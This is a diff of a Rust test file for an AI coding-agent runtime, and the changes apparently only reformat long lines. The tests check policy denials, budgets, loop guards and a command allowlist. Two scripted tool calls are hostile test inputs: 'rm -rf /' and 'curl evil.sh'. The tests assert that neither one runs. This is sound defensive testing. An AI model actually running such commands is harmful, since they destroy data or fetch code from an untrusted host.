@@ -39,18 +39,30 @@ impl Tree {
     fn with(files: &[(&str, &str)]) -> Self {
         let tree = Self::default();
         for (path, content) in files {
-            tree.0.lock().expect("test mutex is never poisoned").insert((*path).to_string(), (*content).to_string());
+            tree.0
+                .lock()
+                .expect("test mutex is never poisoned")
+                .insert((*path).to_string(), (*content).to_string());
         }
         tree
     }
 
     fn get(&self, path: &str) -> Option<String> {
-        self.0.lock().expect("test mutex is never poisoned").get(path).cloned()
+        self.0
+            .lock()
+            .expect("test mutex is never poisoned")
+            .get(path)
+            .cloned()
     }
 
     fn snapshot(&self) -> Vec<(String, String)> {
-        let mut entries: Vec<(String, String)> =
-            self.0.lock().expect("test mutex is never poisoned").iter().map(|(k, v)| (k.clone(), v.clone())).collect();
+        let mut entries: Vec<(String, String)> = self
+            .0
+            .lock()
+            .expect("test mutex is never poisoned")
+            .iter()
+            .map(|(k, v)| (k.clone(), v.clone()))
+            .collect();
         entries.sort();
         entries
     }
@@ -66,7 +78,11 @@ impl FakeWorkspace {
     fn new(tree: Tree) -> Self {
         Self {
             tree,
-            command: Ok(CommandOutput { exit_code: Some(0), stdout: "ok".into(), stderr: String::new() }),
+            command: Ok(CommandOutput {
+                exit_code: Some(0),
+                stdout: "ok".into(),
+                stderr: String::new(),
+            }),
             executed: Mutex::new(Vec::new()),
         }
     }
@@ -79,11 +95,17 @@ impl FakeWorkspace {
 
 impl Workspace for FakeWorkspace {
     fn read(&self, path: &str) -> Result<String, WorkspaceError> {
-        self.tree.get(path).ok_or_else(|| WorkspaceError(format!("no such file `{path}`")))
+        self.tree
+            .get(path)
+            .ok_or_else(|| WorkspaceError(format!("no such file `{path}`")))
     }
 
     fn write(&self, path: &str, content: &str) -> Result<(), WorkspaceError> {
-        self.tree.0.lock().expect("test mutex is never poisoned").insert(path.to_string(), content.to_string());
+        self.tree
+            .0
+            .lock()
+            .expect("test mutex is never poisoned")
+            .insert(path.to_string(), content.to_string());
         Ok(())
     }
 
@@ -94,7 +116,10 @@ impl Workspace for FakeWorkspace {
     fn run(&self, program: &str, args: &[String]) -> Result<CommandOutput, WorkspaceError> {
         let mut invocation = vec![program.to_string()];
         invocation.extend_from_slice(args);
-        self.executed.lock().expect("test mutex is never poisoned").push(invocation);
+        self.executed
+            .lock()
+            .expect("test mutex is never poisoned")
+            .push(invocation);
         self.command.clone()
     }
 }
@@ -108,11 +133,17 @@ struct MarkerJudge {
 
 impl MarkerJudge {
     fn new() -> Self {
-        Self { policy: AgentPolicy::default(), failing: false }
+        Self {
+            policy: AgentPolicy::default(),
+            failing: false,
+        }
     }
 
     fn failing() -> Self {
-        Self { policy: AgentPolicy::default(), failing: true }
+        Self {
+            policy: AgentPolicy::default(),
+            failing: true,
+        }
     }
 }
 
@@ -147,11 +178,17 @@ struct MarkerAnalyzer {
 
 impl MarkerAnalyzer {
     fn new(tree: Tree) -> Self {
-        Self { tree, failing: false }
+        Self {
+            tree,
+            failing: false,
+        }
     }
 
     fn failing() -> Self {
-        Self { tree: Tree::default(), failing: true }
+        Self {
+            tree: Tree::default(),
+            failing: true,
+        }
     }
 }
 
@@ -189,14 +226,22 @@ impl ScriptedModel {
         Self {
             turns: Mutex::new(turns.into()),
             calls: AtomicU32::new(0),
-            exhausted: AssistantTurn { text: Some("done".into()), calls: vec![], usage: usage(1) },
+            exhausted: AssistantTurn {
+                text: Some("done".into()),
+                calls: vec![],
+                usage: usage(1),
+            },
         }
     }
 
     /// Repeats one turn forever — for the budget and loop-guard tests, where
     /// the point is that the *runtime* stops, not that the script ran out.
     fn repeating(turn: AssistantTurn) -> Self {
-        Self { turns: Mutex::new(Default::default()), calls: AtomicU32::new(0), exhausted: turn }
+        Self {
+            turns: Mutex::new(Default::default()),
+            calls: AtomicU32::new(0),
+            exhausted: turn,
+        }
     }
 
     fn call_count(&self) -> u32 {
@@ -211,29 +256,51 @@ impl ChatModel for ScriptedModel {
         _tools: &[ToolSpec],
     ) -> Result<AssistantTurn, ModelError> {
         self.calls.fetch_add(1, Ordering::Relaxed);
-        let next = self.turns.lock().expect("test mutex is never poisoned").pop_front();
+        let next = self
+            .turns
+            .lock()
+            .expect("test mutex is never poisoned")
+            .pop_front();
         next.unwrap_or_else(|| Ok(self.exhausted.clone()))
     }
 }
 
 fn usage(total: u64) -> TokenUsage {
-    TokenUsage { input: total, output: 0 }
+    TokenUsage {
+        input: total,
+        output: 0,
+    }
 }
 
 fn call(name: &str, input: serde_json::Value) -> ToolCall {
-    ToolCall { id: format!("call-{name}"), name: name.to_string(), input }
+    ToolCall {
+        id: format!("call-{name}"),
+        name: name.to_string(),
+        input,
+    }
 }
 
 fn turn_calling(name: &str, input: serde_json::Value) -> AssistantTurn {
-    AssistantTurn { text: None, calls: vec![call(name, input)], usage: usage(10) }
+    AssistantTurn {
+        text: None,
+        calls: vec![call(name, input)],
+        usage: usage(10),
+    }
 }
 
 fn write_turn(path: &str, content: &str) -> AssistantTurn {
-    turn_calling("write", serde_json::json!({ "path": path, "content": content }))
+    turn_calling(
+        "write",
+        serde_json::json!({ "path": path, "content": content }),
+    )
 }
 
 fn config() -> RunConfig {
-    RunConfig { scope: ".".to_string(), max_rejections: 1, ..RunConfig::new("remove the eval sink") }
+    RunConfig {
+        scope: ".".to_string(),
+        max_rejections: 1,
+        ..RunConfig::new("remove the eval sink")
+    }
 }
 
 fn runtime(
@@ -250,9 +317,14 @@ fn runtime(
 async fn a_clean_write_lands_and_the_analyzer_closes_the_task() {
     let tree = Tree::with(&[("src/a.rs", "fn a() { eval(x) }")]);
     let model = ScriptedModel::new(vec![Ok(write_turn("src/a.rs", "fn a() { safe(x) }"))]);
-    let outcome = runtime(model, tree.clone(), MarkerJudge::new(), config()).run().await;
+    let outcome = runtime(model, tree.clone(), MarkerJudge::new(), config())
+        .run()
+        .await;
 
-    assert!(matches!(outcome, RunOutcome::Completed { .. }), "got {outcome:?}");
+    assert!(
+        matches!(outcome, RunOutcome::Completed { .. }),
+        "got {outcome:?}"
+    );
     assert_eq!(outcome.exit_code(), 0);
     assert_eq!(tree.get("src/a.rs").as_deref(), Some("fn a() { safe(x) }"));
 }
@@ -266,7 +338,10 @@ struct SpyObserver {
 
 impl Observer for SpyObserver {
     fn on_event(&self, event: AgentEvent) {
-        self.events.lock().expect("test mutex is never poisoned").push(event);
+        self.events
+            .lock()
+            .expect("test mutex is never poisoned")
+            .push(event);
     }
 }
 
@@ -278,7 +353,10 @@ async fn a_run_reports_its_events_to_the_observer_in_order() {
     let runtime = runtime(model, tree, MarkerJudge::new(), config()).with_observer(spy.clone());
 
     let outcome = runtime.run().await;
-    assert!(matches!(outcome, RunOutcome::Completed { .. }), "got {outcome:?}");
+    assert!(
+        matches!(outcome, RunOutcome::Completed { .. }),
+        "got {outcome:?}"
+    );
 
     let events = spy.events.lock().expect("test mutex is never poisoned");
     let kinds: Vec<&str> = events
@@ -307,7 +385,12 @@ async fn a_run_reports_its_events_to_the_observer_in_order() {
             "finished",
         ]
     );
-    assert!(matches!(events.last(), Some(AgentEvent::Finished { outcome: RunOutcome::Completed { .. } })));
+    assert!(matches!(
+        events.last(),
+        Some(AgentEvent::Finished {
+            outcome: RunOutcome::Completed { .. }
+        })
+    ));
 }
 
 #[tokio::test]
@@ -316,19 +399,30 @@ async fn a_denied_write_never_reaches_the_workspace() {
     let before = tree.snapshot();
     // One denied write, then the model gives up.
     let model = ScriptedModel::new(vec![Ok(write_turn("src/a.rs", "fn a() { eval(x) }"))]);
-    let outcome = runtime(model, tree.clone(), MarkerJudge::new(), config()).run().await;
+    let outcome = runtime(model, tree.clone(), MarkerJudge::new(), config())
+        .run()
+        .await;
 
-    assert_eq!(tree.snapshot(), before, "a denied write must not change the tree");
+    assert_eq!(
+        tree.snapshot(),
+        before,
+        "a denied write must not change the tree"
+    );
     // The baseline was clean and nothing landed, so nothing regressed: the
     // run completes having done nothing, which is the honest answer.
-    assert!(matches!(outcome, RunOutcome::Completed { .. }), "got {outcome:?}");
+    assert!(
+        matches!(outcome, RunOutcome::Completed { .. }),
+        "got {outcome:?}"
+    );
 }
 
 #[tokio::test]
 async fn three_consecutive_denials_trip_the_circuit_breaker() {
     let tree = Tree::with(&[("src/a.rs", "fn a() {}")]);
     let model = ScriptedModel::repeating(write_turn("src/a.rs", "fn a() { eval(x) }"));
-    let outcome = runtime(model, tree.clone(), MarkerJudge::new(), config()).run().await;
+    let outcome = runtime(model, tree.clone(), MarkerJudge::new(), config())
+        .run()
+        .await;
 
     let RunOutcome::CircuitBreakerTripped { rules, .. } = &outcome else {
         panic!("expected the breaker to trip, got {outcome:?}");
@@ -348,7 +442,9 @@ async fn three_identical_allowed_writes_stop_the_run_as_a_loop() {
     config.target_rule = Some(rule("owasp:eval-usage"));
     let outcome = runtime(model, tree, MarkerJudge::new(), config).run().await;
 
-    let RunOutcome::Looping { path, .. } = &outcome else { panic!("expected a loop stop, got {outcome:?}") };
+    let RunOutcome::Looping { path, .. } = &outcome else {
+        panic!("expected a loop stop, got {outcome:?}")
+    };
     assert_eq!(path, "src/a.rs");
     assert_eq!(outcome.exit_code(), 6);
 }
@@ -356,25 +452,49 @@ async fn three_identical_allowed_writes_stop_the_run_as_a_loop() {
 #[tokio::test]
 async fn the_turn_budget_ends_the_run_with_its_own_verdict() {
     let tree = Tree::with(&[("src/a.rs", "fn a() { eval(x) }")]);
-    let model = ScriptedModel::repeating(turn_calling("read", serde_json::json!({ "path": "src/a.rs" })));
+    let model = ScriptedModel::repeating(turn_calling(
+        "read",
+        serde_json::json!({ "path": "src/a.rs" }),
+    ));
     let mut config = config();
-    config.budget = Budget { max_turns: 2, max_tokens: u64::MAX };
+    config.budget = Budget {
+        max_turns: 2,
+        max_tokens: u64::MAX,
+    };
     let outcome = runtime(model, tree, MarkerJudge::new(), config).run().await;
 
-    assert_eq!(outcome, RunOutcome::BudgetExhausted { turns: 2, exhaustion: Exhaustion::Turns { limit: 2 } });
+    assert_eq!(
+        outcome,
+        RunOutcome::BudgetExhausted {
+            turns: 2,
+            exhaustion: Exhaustion::Turns { limit: 2 }
+        }
+    );
     assert_eq!(outcome.exit_code(), 4);
 }
 
 #[tokio::test]
 async fn the_token_budget_ends_the_run_with_its_own_verdict() {
     let tree = Tree::with(&[("src/a.rs", "fn a() { eval(x) }")]);
-    let model = ScriptedModel::repeating(turn_calling("read", serde_json::json!({ "path": "src/a.rs" })));
+    let model = ScriptedModel::repeating(turn_calling(
+        "read",
+        serde_json::json!({ "path": "src/a.rs" }),
+    ));
     let mut config = config();
-    config.budget = Budget { max_turns: u32::MAX, max_tokens: 25 };
+    config.budget = Budget {
+        max_turns: u32::MAX,
+        max_tokens: 25,
+    };
     let outcome = runtime(model, tree, MarkerJudge::new(), config).run().await;
 
     assert!(
-        matches!(outcome, RunOutcome::BudgetExhausted { exhaustion: Exhaustion::Tokens { .. }, .. }),
+        matches!(
+            outcome,
+            RunOutcome::BudgetExhausted {
+                exhaustion: Exhaustion::Tokens { .. },
+                ..
+            }
+        ),
         "got {outcome:?}"
     );
 }
@@ -412,17 +532,31 @@ async fn a_regression_the_agent_introduced_blocks_completion() {
             "edit",
             serde_json::json!({ "path": "src/a.rs", "old_string": "{}", "new_string": text }),
         ))]);
-        let permissive =
-            MarkerJudge { policy: AgentPolicy::parse("[agent]\nenabled = false\n").expect("valid policy"), failing: false };
-        let config = RunConfig { max_rejections: 0, ..config() };
-        AgentRuntime::new(model, FakeWorkspace::new(tree.clone()), permissive, MarkerAnalyzer::new(tree), config)
-            .run()
-            .await
+        let permissive = MarkerJudge {
+            policy: AgentPolicy::parse("[agent]\nenabled = false\n").expect("valid policy"),
+            failing: false,
+        };
+        let config = RunConfig {
+            max_rejections: 0,
+            ..config()
+        };
+        AgentRuntime::new(
+            model,
+            FakeWorkspace::new(tree.clone()),
+            permissive,
+            MarkerAnalyzer::new(tree),
+            config,
+        )
+        .run()
+        .await
     }
 
     // `EVAL(` does not contain `eval(`, so nothing regresses and the run
     // completes — the control half of this test.
-    assert!(matches!(run_edit_inserting("{ EVAL(x) }").await, RunOutcome::Completed { .. }));
+    assert!(matches!(
+        run_edit_inserting("{ EVAL(x) }").await,
+        RunOutcome::Completed { .. }
+    ));
 
     let outcome = run_edit_inserting("{ eval(x) }").await;
     let RunOutcome::Incomplete { completion, .. } = &outcome else {
@@ -435,9 +569,13 @@ async fn a_regression_the_agent_introduced_blocks_completion() {
 async fn a_model_failure_is_reported_as_a_failure_not_a_verdict() {
     let tree = Tree::with(&[("src/a.rs", "fn a() {}")]);
     let model = ScriptedModel::new(vec![Err(ModelError("429 rate limited".into()))]);
-    let outcome = runtime(model, tree, MarkerJudge::new(), config()).run().await;
+    let outcome = runtime(model, tree, MarkerJudge::new(), config())
+        .run()
+        .await;
 
-    let RunOutcome::Failed { error, .. } = &outcome else { panic!("got {outcome:?}") };
+    let RunOutcome::Failed { error, .. } = &outcome else {
+        panic!("got {outcome:?}")
+    };
     assert!(error.contains("429"));
     assert_eq!(outcome.exit_code(), 1);
 }
@@ -447,9 +585,14 @@ async fn a_judge_that_cannot_judge_stops_the_run_instead_of_writing_unjudged() {
     let tree = Tree::with(&[("src/a.rs", "fn a() {}")]);
     let before = tree.snapshot();
     let model = ScriptedModel::new(vec![Ok(write_turn("src/a.rs", "fn a() { harmless() }"))]);
-    let outcome = runtime(model, tree.clone(), MarkerJudge::failing(), config()).run().await;
+    let outcome = runtime(model, tree.clone(), MarkerJudge::failing(), config())
+        .run()
+        .await;
 
-    assert!(matches!(outcome, RunOutcome::Failed { .. }), "got {outcome:?}");
+    assert!(
+        matches!(outcome, RunOutcome::Failed { .. }),
+        "got {outcome:?}"
+    );
     assert_eq!(tree.snapshot(), before, "an unjudged write must never land");
 }
 
@@ -457,49 +600,106 @@ async fn a_judge_that_cannot_judge_stops_the_run_instead_of_writing_unjudged() {
 async fn an_analyzer_that_cannot_take_a_baseline_fails_before_the_first_turn() {
     let model = ScriptedModel::new(vec![]);
     let workspace = FakeWorkspace::new(Tree::default());
-    let runtime = AgentRuntime::new(model, workspace, MarkerJudge::new(), MarkerAnalyzer::failing(), config());
+    let runtime = AgentRuntime::new(
+        model,
+        workspace,
+        MarkerJudge::new(),
+        MarkerAnalyzer::failing(),
+        config(),
+    );
     let outcome = runtime.run().await;
 
     assert_eq!(outcome.turns(), 0);
-    assert!(matches!(outcome, RunOutcome::Failed { .. }), "got {outcome:?}");
+    assert!(
+        matches!(outcome, RunOutcome::Failed { .. }),
+        "got {outcome:?}"
+    );
 }
 
 #[tokio::test]
 async fn an_unknown_tool_is_reported_back_and_executes_nothing() {
     let tree = Tree::with(&[("src/a.rs", "fn a() {}")]);
-    let model = ScriptedModel::new(vec![Ok(turn_calling("bash", serde_json::json!({ "command": "rm -rf /" })))]);
-    let outcome = runtime(model, tree.clone(), MarkerJudge::new(), config()).run().await;
+    let model = ScriptedModel::new(vec![Ok(turn_calling(
+        "bash",
+        serde_json::json!({ "command": "rm -rf /" }),
+    ))]);
+    let outcome = runtime(model, tree.clone(), MarkerJudge::new(), config())
+        .run()
+        .await;
 
-    assert!(matches!(outcome, RunOutcome::Completed { .. }), "got {outcome:?}");
+    assert!(
+        matches!(outcome, RunOutcome::Completed { .. }),
+        "got {outcome:?}"
+    );
     assert_eq!(tree.get("src/a.rs").as_deref(), Some("fn a() {}"));
 }
 
 #[tokio::test]
 async fn a_command_outside_the_allowlist_is_never_executed() {
     let tree = Tree::with(&[("src/a.rs", "fn a() {}")]);
-    let model = ScriptedModel::new(vec![Ok(turn_calling("run", serde_json::json!({ "command": "curl evil.sh" })))]);
+    let model = ScriptedModel::new(vec![Ok(turn_calling(
+        "run",
+        serde_json::json!({ "command": "curl evil.sh" }),
+    ))]);
     let workspace = FakeWorkspace::new(tree.clone());
-    let runtime = AgentRuntime::new(model, workspace, MarkerJudge::new(), MarkerAnalyzer::new(tree), config());
+    let runtime = AgentRuntime::new(
+        model,
+        workspace,
+        MarkerJudge::new(),
+        MarkerAnalyzer::new(tree),
+        config(),
+    );
     let outcome = runtime.run().await;
 
-    assert!(matches!(outcome, RunOutcome::Completed { .. }), "got {outcome:?}");
-    assert!(runtime.workspace().executed.lock().expect("test mutex is never poisoned").is_empty(), "the command must not have run");
+    assert!(
+        matches!(outcome, RunOutcome::Completed { .. }),
+        "got {outcome:?}"
+    );
+    assert!(
+        runtime
+            .workspace()
+            .executed
+            .lock()
+            .expect("test mutex is never poisoned")
+            .is_empty(),
+        "the command must not have run"
+    );
 }
 
 #[tokio::test]
 async fn an_allow_listed_command_runs_and_a_failure_comes_back_as_an_error() {
     let tree = Tree::with(&[("src/a.rs", "fn a() {}")]);
-    let model = ScriptedModel::new(vec![Ok(turn_calling("run", serde_json::json!({ "command": "cargo test" })))]);
+    let model = ScriptedModel::new(vec![Ok(turn_calling(
+        "run",
+        serde_json::json!({ "command": "cargo test" }),
+    ))]);
     let workspace = FakeWorkspace::new(tree.clone()).with_command(Ok(CommandOutput {
         exit_code: Some(101),
         stdout: String::new(),
         stderr: "test failed".into(),
     }));
-    let runtime = AgentRuntime::new(model, workspace, MarkerJudge::new(), MarkerAnalyzer::new(tree), config());
+    let runtime = AgentRuntime::new(
+        model,
+        workspace,
+        MarkerJudge::new(),
+        MarkerAnalyzer::new(tree),
+        config(),
+    );
     let outcome = runtime.run().await;
 
-    assert!(matches!(outcome, RunOutcome::Completed { .. }), "got {outcome:?}");
-    assert_eq!(runtime.workspace().executed.lock().expect("test mutex is never poisoned").as_slice(), [vec!["cargo".to_string(), "test".to_string()]]);
+    assert!(
+        matches!(outcome, RunOutcome::Completed { .. }),
+        "got {outcome:?}"
+    );
+    assert_eq!(
+        runtime
+            .workspace()
+            .executed
+            .lock()
+            .expect("test mutex is never poisoned")
+            .as_slice(),
+        [vec!["cargo".to_string(), "test".to_string()]]
+    );
 }
 
 #[tokio::test]
@@ -511,10 +711,19 @@ async fn an_edit_is_judged_on_the_resulting_file_not_the_inserted_substring() {
         "edit",
         serde_json::json!({ "path": "src/a.rs", "old_string": "ev", "new_string": "eval(x) }" }),
     ))]);
-    let outcome = runtime(model, tree.clone(), MarkerJudge::new(), config()).run().await;
+    let outcome = runtime(model, tree.clone(), MarkerJudge::new(), config())
+        .run()
+        .await;
 
-    assert_eq!(tree.snapshot(), before, "the edit's *result* violates policy and must be denied");
-    assert!(matches!(outcome, RunOutcome::Completed { .. }), "got {outcome:?}");
+    assert_eq!(
+        tree.snapshot(),
+        before,
+        "the edit's *result* violates policy and must be denied"
+    );
+    assert!(
+        matches!(outcome, RunOutcome::Completed { .. }),
+        "got {outcome:?}"
+    );
 }
 
 #[tokio::test]
@@ -525,10 +734,15 @@ async fn an_edit_whose_target_string_is_absent_is_an_error_rather_than_a_write()
         "edit",
         serde_json::json!({ "path": "src/a.rs", "old_string": "nowhere", "new_string": "x" }),
     ))]);
-    let outcome = runtime(model, tree.clone(), MarkerJudge::new(), config()).run().await;
+    let outcome = runtime(model, tree.clone(), MarkerJudge::new(), config())
+        .run()
+        .await;
 
     assert_eq!(tree.snapshot(), before);
-    assert!(matches!(outcome, RunOutcome::Completed { .. }), "got {outcome:?}");
+    assert!(
+        matches!(outcome, RunOutcome::Completed { .. }),
+        "got {outcome:?}"
+    );
 }
 
 #[tokio::test]
@@ -539,7 +753,13 @@ async fn the_model_is_asked_again_after_the_analyzer_objects() {
     config.target_rule = Some(rule("owasp:eval-usage"));
     config.max_rejections = 2;
     let workspace = FakeWorkspace::new(tree.clone());
-    let runtime = AgentRuntime::new(model, workspace, MarkerJudge::new(), MarkerAnalyzer::new(tree), config);
+    let runtime = AgentRuntime::new(
+        model,
+        workspace,
+        MarkerJudge::new(),
+        MarkerAnalyzer::new(tree),
+        config,
+    );
     runtime.run().await;
 
     // Three turns: the first claim plus two more after the analyzer sent it
@@ -550,12 +770,30 @@ async fn the_model_is_asked_again_after_the_analyzer_objects() {
 #[test]
 fn every_terminal_state_has_its_own_exit_code() {
     let outcomes = [
-        RunOutcome::Completed { turns: 1, summary: None },
-        RunOutcome::Failed { turns: 1, error: "x".into() },
-        RunOutcome::Incomplete { turns: 1, completion: Completion::Done },
-        RunOutcome::BudgetExhausted { turns: 1, exhaustion: Exhaustion::Turns { limit: 1 } },
-        RunOutcome::CircuitBreakerTripped { turns: 1, rules: vec![] },
-        RunOutcome::Looping { turns: 1, path: "a".into() },
+        RunOutcome::Completed {
+            turns: 1,
+            summary: None,
+        },
+        RunOutcome::Failed {
+            turns: 1,
+            error: "x".into(),
+        },
+        RunOutcome::Incomplete {
+            turns: 1,
+            completion: Completion::Done,
+        },
+        RunOutcome::BudgetExhausted {
+            turns: 1,
+            exhaustion: Exhaustion::Turns { limit: 1 },
+        },
+        RunOutcome::CircuitBreakerTripped {
+            turns: 1,
+            rules: vec![],
+        },
+        RunOutcome::Looping {
+            turns: 1,
+            path: "a".into(),
+        },
     ];
     let mut codes: Vec<u8> = outcomes.iter().map(RunOutcome::exit_code).collect();
     let total = codes.len();
@@ -570,6 +808,10 @@ fn every_terminal_state_has_its_own_exit_code() {
 
 #[test]
 fn a_command_killed_by_a_signal_is_not_reported_as_a_clean_exit() {
-    let output = CommandOutput { exit_code: None, stdout: String::new(), stderr: String::new() };
+    let output = CommandOutput {
+        exit_code: None,
+        stdout: String::new(),
+        stderr: String::new(),
+    };
     assert!(output.render().contains("terminated by signal"));
 }
